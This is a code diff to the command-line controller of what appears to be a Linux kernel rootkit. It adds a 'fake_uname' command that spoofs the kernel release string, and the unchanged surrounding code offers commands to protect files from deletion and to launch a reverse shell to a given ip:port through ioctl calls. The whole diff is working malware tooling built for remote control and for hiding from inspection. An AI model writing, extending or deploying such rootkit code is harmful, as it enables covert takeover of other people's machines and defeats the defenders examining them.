@@ -28,6 +28,7 @@ static void usage(const char *prog)
     printf("  protect <filepath>        Protect file from deletion\n");
     printf("  unprotect <filepath>      Remove file protection\n");
     printf("  revshell <ip:port>        Launch reverse shell to target\n");
+    printf("  fake_uname <str|->        Spoof uname -r release (use '-' to clear)\n");
 }
 
 int main(int argc, char *argv[])
@@ -171,6 +172,15 @@ int main(int argc, char *argv[])
             perror("ioctl REVERSE_SHELL");
         else
             printf("Reverse shell launched to %s\n", argv[2]);
+
+    } else if (strcmp(argv[1], "fake_uname") == 0 && argc >= 3) {
+        args.target = (strcmp(argv[2], "-") == 0) ? 0 : (unsigned long)argv[2];
+        if (ioctl(fd, RK_CMD_FAKE_UNAME, &args) < 0)
+            perror("ioctl FAKE_UNAME");
+        else if (args.target == 0)
+            printf("uname spoof cleared\n");
+        else
+            printf("uname release spoofed: %s\n", argv[2]);
 
     } else {
         usage(argv[0]);
